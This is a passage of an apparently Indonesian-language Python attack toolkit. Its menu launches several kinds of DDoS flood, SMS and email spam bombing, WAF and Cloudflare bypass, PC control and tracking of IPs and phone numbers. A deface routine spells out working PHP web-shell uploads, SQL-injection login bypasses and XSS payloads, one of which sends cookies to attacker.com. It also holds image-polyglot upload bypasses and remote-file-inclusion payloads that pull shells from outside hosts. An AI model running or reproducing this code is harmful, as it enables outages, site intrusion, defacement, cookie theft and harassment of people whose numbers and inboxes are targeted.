                    
                    if monitor_choice == "1":
                        try:
                            print("[*] Membuka jendela monitor kecepatan server...")
                            speed_monitor = SpeedMonitorWindow(target)
                            time.sleep(1)
                            
                            batch_size = 100
                            total_batches = (threads + batch_size - 1) // batch_size
                            
                            def start_attack():
                                for batch in range(total_batches):
                                    batch_threads = []
                                    current_batch_size = min(batch_size, threads - (batch * batch_size))
                                    
                                    for _ in range(current_batch_size):
                                        t = threading.Thread(target=http_flood, args=(target, "ddos_attack.log", speed))
                                        t.daemon = True
                                        batch_threads.append(t)
                                        t.start()
                                    
                                    time.sleep(0.1)
                            
                            attack_thread = threading.Thread(target=start_attack)
                            attack_thread.daemon = True
                            attack_thread.start()
                            
                            speed_monitor.root.mainloop()
                            
                        except Exception as e:
                            print(f"[-] Error dengan Tkinter: {str(e)}")
                            print("[*] Beralih ke monitor CMD...")
                            monitor_speed_cmd(target)
                    else:
                        print("[*] Menggunakan monitor CMD...")
                        attack_threads = []
                        for _ in range(threads):
                            t = threading.Thread(target=http_flood, args=(target, "ddos_attack.log", speed))
                            t.daemon = True
                            attack_threads.append(t)
                            t.start()
                        monitor_speed_cmd(target)
                
                elif ddos_choice == "3":  # Slowloris
                    target = input("\n[?] Masukkan URL target (contoh: https://example.com): ")
                    print(f"\n[+] Memulai Slowloris attack ke {target}...")
                    print("[*] Tekan Ctrl+C untuk menghentikan serangan")
                    try:
                        slowloris_attack(target, "ddos_attack.log")
                    except KeyboardInterrupt:
                        print("\n[!] Serangan dihentikan oleh pengguna")
                
                elif ddos_choice == "4":  # SYN Flood
                    target = input("\n[?] Masukkan URL target (contoh: https://example.com): ")
                    print(f"\n[+] Memulai SYN Flood attack ke {target}...")
                    print("[*] Tekan Ctrl+C untuk menghentikan serangan")
                    try:
                        syn_flood(target, "ddos_attack.log")
                    except KeyboardInterrupt:
                        print("\n[!] Serangan dihentikan oleh pengguna")
                
                elif ddos_choice == "5":  # UDP Flood
                    target = input("\n[?] Masukkan URL target (contoh: https://example.com): ")
                    print(f"\n[+] Memulai UDP Flood attack ke {target}...")
                    print("[*] Tekan Ctrl+C untuk menghentikan serangan")
                    try:
                        udp_flood(target, "ddos_attack.log")
                    except KeyboardInterrupt:
                        print("\n[!] Serangan dihentikan oleh pengguna")
                
                elif ddos_choice == "6":  # ICMP Flood
                    target = input("\n[?] Masukkan URL target (contoh: https://example.com): ")
                    print(f"\n[+] Memulai ICMP Flood attack ke {target}...")
                    print("[*] Tekan Ctrl+C untuk menghentikan serangan")
                    try:
                        icmp_flood(target, "ddos_attack.log")
                    except KeyboardInterrupt:
                        print("\n[!] Serangan dihentikan oleh pengguna")
                
                elif ddos_choice == "7":  # Multi-Vector
                    target = input("\n[?] Masukkan URL target (contoh: https://example.com): ")
                    print(f"\n[+] Memulai Multi-Vector attack ke {target}...")
                    print("[*] Tekan Ctrl+C untuk menghentikan serangan")
                    try:
                        multi_vector_attack(target, "ddos_attack.log")
                    except KeyboardInterrupt:
                        print("\n[!] Serangan dihentikan oleh pengguna")
                
                elif ddos_choice == "8":  # Aggressive DDoS
                    target = input("\n[?] Masukkan URL target (contoh: https://example.com): ")
                    print(f"\n[+] Memulai serangan DDoS agresif ke {target}...")
                    print("[*] Tekan Ctrl+C untuk menghentikan serangan")
                    try:
                        aggressive_ddos(target)
                    except KeyboardInterrupt:
                        print("\n[!] Serangan dihentikan oleh pengguna")
                
                elif ddos_choice == "9":
                    break
                
                else:
                    print("\n[-] Pilihan tidak valid!")
                    time.sleep(1)
        
        elif choice == "2":  # Spam SMS
            while True:
                clear_screen()
                print_banner()
                sms_choice = show_sms_menu()
                
                if sms_choice in ["1", "2", "3", "4"]:
                    phone = input("\n[?] Masukkan nomor telepon target: ")
                    print(f"\n[+] Memulai spam ke {phone}...")
                    print("[*] Tekan Ctrl+C untuk menghentikan spam")
                    try:
                        sms_spam(phone, "sms_spam.log")
                    except KeyboardInterrupt:
                        print("\n[!] Spam dihentikan oleh pengguna")
                
                elif sms_choice == "5":
                    break
                
                else:
                    print("\n[-] Pilihan tidak valid!")
                    time.sleep(1)
        
        elif choice == "3":  # Spam Email
            while True:
                clear_screen()
                print_banner()
                email_choice = show_email_menu()
                
                if email_choice == "1":
                    email = input("\n[?] Masukkan email target: ")
                    api_key = input("[?] Masukkan SendGrid API Key: ")
                    print(f"\n[+] Memulai spam email ke {email} menggunakan SendGrid...")
                    print("[*] Tekan Ctrl+C untuk menghentikan spam")
                    try:
                        email_spam(email, "email_spam.log")
                    except KeyboardInterrupt:
                        print("\n[!] Spam dihentikan oleh pengguna")
                
                elif email_choice == "2":
                    email = input("\n[?] Masukkan email target: ")
                    api_key = input("[?] Masukkan Mailgun API Key: ")
                    print(f"\n[+] Memulai spam email ke {email} menggunakan Mailgun...")
                    print("[*] Tekan Ctrl+C untuk menghentikan spam")
                    try:
                        email_spam(email, "email_spam.log")
                    except KeyboardInterrupt:
                        print("\n[!] Spam dihentikan oleh pengguna")
                
                elif email_choice == "3":
                    email = input("\n[?] Masukkan email target: ")
                    gmail = input("[?] Masukkan Gmail: ")
                    app_password = input("[?] Masukkan App Password: ")
                    print(f"\n[+] Memulai spam email ke {email} menggunakan SMTP Gmail...")
                    print("[*] Tekan Ctrl+C untuk menghentikan spam")
                    try:
                        email_spam(email, "email_spam.log")
                    except KeyboardInterrupt:
                        print("\n[!] Spam dihentikan oleh pengguna")
                
                elif email_choice == "4":
                    email = input("\n[?] Masukkan email target: ")
                    print(f"\n[+] Memulai spam email ke {email} menggunakan semua API...")
                    print("[*] Tekan Ctrl+C untuk menghentikan spam")
                    try:
                        email_spam(email, "email_spam.log")
                    except KeyboardInterrupt:
                        print("\n[!] Spam dihentikan oleh pengguna")
                
                elif email_choice == "5":
                    break
                
                else:
                    print("\n[-] Pilihan tidak valid!")
                    time.sleep(1)
        
        elif choice == "4":  # Bypass & Deface
            while True:
                clear_screen()
                print_banner()
                bypass_choice = show_bypass_menu()
                
                if bypass_choice == "1":
                    target = input("\n[?] Masukkan URL target: ")
                    print(f"\n[+] Memulai bypass Cloudflare ke {target}...")
                    print("[*] Tekan Ctrl+C untuk menghentikan bypass")
                    try:
                        bypass_cloudflare(target, "bypass.log")
                    except KeyboardInterrupt:
                        print("\n[!] Bypass dihentikan oleh pengguna")
                
                elif bypass_choice == "2":
                    target = input("\n[?] Masukkan URL target: ")
                    print(f"\n[+] Memulai bypass WAF ke {target}...")
                    print("[*] Tekan Ctrl+C untuk menghentikan bypass")
                    try:
                        bypass_waf(target, "bypass.log")
                    except KeyboardInterrupt:
                        print("\n[!] Bypass dihentikan oleh pengguna")
                
                elif bypass_choice == "3":
                    target = input("\n[?] Masukkan URL target: ")
                    print(f"\n[+] Memulai deface website {target}...")
                    print("[*] Tekan Ctrl+C untuk menghentikan deface")
                    try:
                        deface_website(target, "deface.log")
                    except KeyboardInterrupt:
                        print("\n[!] Deface dihentikan oleh pengguna")
                
                elif bypass_choice == "4":
                    break
                
                else:
                    print("\n[-] Pilihan tidak valid!")
                    time.sleep(1)
        
        elif choice == "5":  # Lacak IP
            while True:
                clear_screen()
                print_banner()
                ip_choice = show_ip_menu()
                
                if ip_choice == "1":
                    ip = input("\n[?] Masukkan IP address: ")
                    print(f"\n[+] Melacak IP {ip}...")
                    lacak_ip(ip)
                    input("\n[?] Tekan Enter untuk kembali...")
                
                elif ip_choice == "2":
                    print("\n[+] Mengecek IP Anda...")
                    get_ip()
                    input("\n[?] Tekan Enter untuk kembali...")
                
                elif ip_choice == "3":
                    domain = input("\n[?] Masukkan domain/website: ")
                    print(f"\n[+] Melacak IP dari {domain}...")
                    get_public_ip(domain)
                    input("\n[?] Tekan Enter untuk kembali...")
                
                elif ip_choice == "4":
                    target = input("\n[?] Masukkan target (IP/domain): ")
                    print(f"\n[+] Mencoba mendapatkan IP target {target}...")
                    get_target_ip(target)
                    input("\n[?] Tekan Enter untuk kembali...")
                
                elif ip_choice == "5":
                    break
                
                else:
                    print("\n[-] Pilihan tidak valid!")
                    time.sleep(1)
        
        elif choice == "6":  # Control PC
            control_pc()
        
        elif choice == "7":  # Lacak Nomor
            while True:
                clear_screen()
                print_banner()
                track_choice = show_track_menu()
                
                if track_choice == "1":
                    phone = input("\n[?] Masukkan nomor telepon: ")
                    print(f"\n[+] Melacak nomor {phone}...")
                    track_phone(phone)
                    input("\n[?] Tekan Enter untuk kembali...")
                
                elif track_choice == "2":
                    phone = input("\n[?] Masukkan nomor WhatsApp: ")
                    print(f"\n[+] Melacak nomor WhatsApp {phone}...")
                    track_phone(phone)
                    input("\n[?] Tekan Enter untuk kembali...")
                
                elif track_choice == "3":
                    phone = input("\n[?] Masukkan nomor telepon/WhatsApp: ")
                    print(f"\n[+] Melacak nomor dan WhatsApp {phone}...")
                    track_phone(phone)
                    input("\n[?] Tekan Enter untuk kembali...")
                
                elif track_choice == "4":
                    break
                
                else:
                    print("\n[-] Pilihan tidak valid!")
                    time.sleep(1)
        
        elif choice == "8":
            print("\n[+] Terima kasih telah menggunakan tools ini!")
            sys.exit(0)
        
        else:
            print("\n[-] Pilihan tidak valid!")
            time.sleep(1)

def deface():
    try:
        print("\n=== MENU DEFACE ===")
        print("[1] Deface dengan Shell Upload")
        print("[2] Deface dengan SQL Injection")
        print("[3] Deface dengan XSS")
        print("[4] Deface dengan File Upload Bypass")
        print("[5] Deface dengan RFI (Remote File Inclusion)")
        print("[6] Kembali ke Menu Utama")
        
        choice = input("\n[?] Pilih metode deface (1-6): ")
        
        if choice == "1":
            try:
                target = input("\n[?] Masukkan URL target (contoh: https://example.com): ").strip()
                if not target:
                    print("[-] URL target tidak boleh kosong!")
                    return
                    
                shell_path = input("[?] Masukkan path shell (contoh: /upload/): ").strip()
                if not shell_path:
                    print("[-] Path shell tidak boleh kosong!")
                    return
                
                print(f"\n[+] Memulai deface ke {target}")
                print("[*] Mencoba upload shell...")
                
                # List of common shell names
                shell_names = [
                    "shell.php", "cmd.php", "wso.php", "c99.php", "r57.php",
                    "index.php", "upload.php", "admin.php", "config.php",
                    "backdoor.php", "bypass.php", "hack.php", "test.php"
                ]
                
                # List of common shell contents
                shell_contents = [
                    "<?php system($_GET['cmd']); ?>",
                    "<?php eval(base64_decode('JHM9JF9SRVFVRVNUWydjbWQnXTsKc3lzdGVtKCRzKTs=')); ?>",
                    "<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>",
                    "<?php @eval($_POST['cmd']); ?>",
                    "<?php passthru($_GET['cmd']); ?>"
                ]
                
                success = False
                for shell_name in shell_names:
                    for shell_content in shell_contents:
                        try:
                            # Try different content types
                            headers = {
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'Accept': '*/*'
                            }
                            
                            # Try different upload methods
                            methods = ['POST', 'PUT']
                            for method in methods:
                                try:
                                    if method == 'POST':
                                        response = requests.post(
                                            f"{target}{shell_path}{shell_name}",
                                            data=shell_content,
                                            headers=headers,
                                            timeout=5,
                                            verify=False
                                        )
                                    else:
                                        response = requests.put(
                                            f"{target}{shell_path}{shell_name}",
                                            data=shell_content,
                                            headers=headers,
                                            timeout=5,
                                            verify=False
                                        )
                                    
                                    if response.status_code in [200, 201, 204]:
                                        print(f"[+] Shell berhasil diupload: {target}{shell_path}{shell_name}")
                                        success = True
                                        break
                                        
                                except requests.exceptions.RequestException as e:
                                    print(f"[-] Error dengan {method}: {str(e)}")
                                    continue
                                    
                            if success:
                                break
                                
                        except Exception as e:
                            print(f"[-] Error: {str(e)}")
                            continue
                            
                    if success:
                        break
                        
                if not success:
                    print("[-] Gagal mengupload shell")
                    
            except Exception as e:
                print(f"[-] Error: {str(e)}")
                return
                
        elif choice == "2":
            try:
                target = input("\n[?] Masukkan URL target (contoh: https://example.com): ").strip()
                if not target:
                    print("[-] URL target tidak boleh kosong!")
                    return
                    
                param = input("[?] Masukkan parameter SQL (contoh: id=): ").strip()
                if not param:
                    print("[-] Parameter SQL tidak boleh kosong!")
                    return
                
                print(f"\n[+] Memulai SQL Injection ke {target}")
                print("[*] Mencoba bypass login...")
                
                # List of SQL injection payloads
                payloads = [
                    "' OR '1'='1",
                    "' OR '1'='1' --",
                    "' OR '1'='1' #",
                    "' OR '1'='1'/*",
                    "admin' --",
                    "admin' #",
                    "admin'/*",
                    "' UNION SELECT 1,2,3--",
                    "' UNION SELECT 1,2,3#",
                    "' UNION SELECT 1,2,3/*"
                ]
                
                success = False
                for payload in payloads:
                    try:
                        response = requests.get(
                            f"{target}?{param}{payload}",
                            headers={'User-Agent': 'Mozilla/5.0'},
                            timeout=5,
                            verify=False
                        )
                        
                        if "admin" in response.text.lower() or "dashboard" in response.text.lower():
                            print(f"[+] SQL Injection berhasil dengan payload: {payload}")
                            success = True
                            break
                            
                    except requests.exceptions.RequestException as e:
                        print(f"[-] Error dengan payload {payload}: {str(e)}")
                        continue
                        
                if not success:
                    print("[-] SQL Injection gagal")
                    
            except Exception as e:
                print(f"[-] Error: {str(e)}")
                return
                
        elif choice == "3":
            try:
                target = input("\n[?] Masukkan URL target (contoh: https://example.com): ").strip()
                if not target:
                    print("[-] URL target tidak boleh kosong!")
                    return
                    
                param = input("[?] Masukkan parameter XSS (contoh: search=): ").strip()
                if not param:
                    print("[-] Parameter XSS tidak boleh kosong!")
                    return
                
                print(f"\n[+] Memulai XSS attack ke {target}")
                print("[*] Mencoba inject script...")
                
                # List of XSS payloads
                payloads = [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>",
                    "javascript:alert('XSS')",
                    "<body onload=alert('XSS')>",
                    "<iframe src=javascript:alert('XSS')>",
                    "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
                    "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>"
                ]
                
                success = False
                for payload in payloads:
                    try:
                        response = requests.get(
                            f"{target}?{param}{payload}",
                            headers={'User-Agent': 'Mozilla/5.0'},
                            timeout=5,
                            verify=False
                        )
                        
                        if payload in response.text:
                            print(f"[+] XSS berhasil dengan payload: {payload}")
                            success = True
                            break
                            
                    except requests.exceptions.RequestException as e:
                        print(f"[-] Error dengan payload {payload}: {str(e)}")
                        continue
                        
                if not success:
                    print("[-] XSS attack gagal")
                    
            except Exception as e:
                print(f"[-] Error: {str(e)}")
                return
                
        elif choice == "4":
            try:
                target = input("\n[?] Masukkan URL target (contoh: https://example.com): ").strip()
                if not target:
                    print("[-] URL target tidak boleh kosong!")
                    return
                    
                upload_path = input("[?] Masukkan path upload (contoh: /upload/): ").strip()
                if not upload_path:
                    print("[-] Path upload tidak boleh kosong!")
                    return
                
                print(f"\n[+] Memulai file upload bypass ke {target}")
                print("[*] Mencoba bypass upload...")
                
                # List of file extensions to try
                extensions = [
                    '.php', '.php3', '.php4', '.php5', '.phtml',
                    '.jpg.php', '.jpeg.php', '.png.php', '.gif.php',
                    '.php.jpg', '.php.jpeg', '.php.png', '.php.gif'
                ]
                
                # List of content types to try
                content_types = [
                    'image/jpeg',
                    'image/png',
                    'image/gif',
                    'application/octet-stream',
                    'text/plain'
                ]
                
                success = False
                for ext in extensions:
                    for content_type in content_types:
                        try:
                            # Create fake image with PHP code
                            image_data = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82'
                            php_code = b'<?php system($_GET["cmd"]); ?>'
                            
                            # Combine image and PHP code
                            payload = image_data + php_code
                            
                            headers = {
                                'User-Agent': 'Mozilla/5.0',
                                'Content-Type': content_type
                            }
                            
                            response = requests.post(
                                f"{target}{upload_path}",
                                files={'file': ('shell' + ext, payload)},
                                headers=headers,
                                timeout=5,
                                verify=False
                            )
                            
                            if response.status_code in [200, 201, 204]:
                                print(f"[+] File berhasil diupload dengan ekstensi: {ext}")
                                success = True
                                break
                                
                        except requests.exceptions.RequestException as e:
                            print(f"[-] Error dengan ekstensi {ext}: {str(e)}")
                            continue
                            
                    if success:
                        break
                        
                if not success:
                    print("[-] File upload bypass gagal")
                    
            except Exception as e:
                print(f"[-] Error: {str(e)}")
                return
                
        elif choice == "5":
            try:
                target = input("\n[?] Masukkan URL target (contoh: https://example.com): ").strip()
                if not target:
                    print("[-] URL target tidak boleh kosong!")
                    return
                    
                param = input("[?] Masukkan parameter RFI (contoh: page=): ").strip()
                if not param:
                    print("[-] Parameter RFI tidak boleh kosong!")
                    return
                
                print(f"\n[+] Memulai RFI attack ke {target}")
                print("[*] Mencoba include remote file...")
                
                # List of RFI payloads
                payloads = [
                    "https://pastebin.com/raw/your_shell",
                    "http://attacker.com/shell.txt",
                    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
                    "php://input",
                    "expect://id",
                    "input://id"
                ]
                
                success = False
                for payload in payloads:
                    try:
                        response = requests.get(
                            f"{target}?{param}{payload}",
                            headers={'User-Agent': 'Mozilla/5.0'},
                            timeout=5,
                            verify=False
                        )
                        
                        if "root" in response.text or "www-data" in response.text:
                            print(f"[+] RFI berhasil dengan payload: {payload}")
                            success = True
                            break
                            
                    except requests.exceptions.RequestException as e:
                        print(f"[-] Error dengan payload {payload}: {str(e)}")
                        continue
                        
                if not success:
                    print("[-] RFI attack gagal")
                    
            except Exception as e:
                print(f"[-] Error: {str(e)}")
                return
                
        elif choice == "6":
            return
            
        else:
            print("\n[-] Pilihan tidak valid")
            
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        return

if __name__ == "__main__":
    main()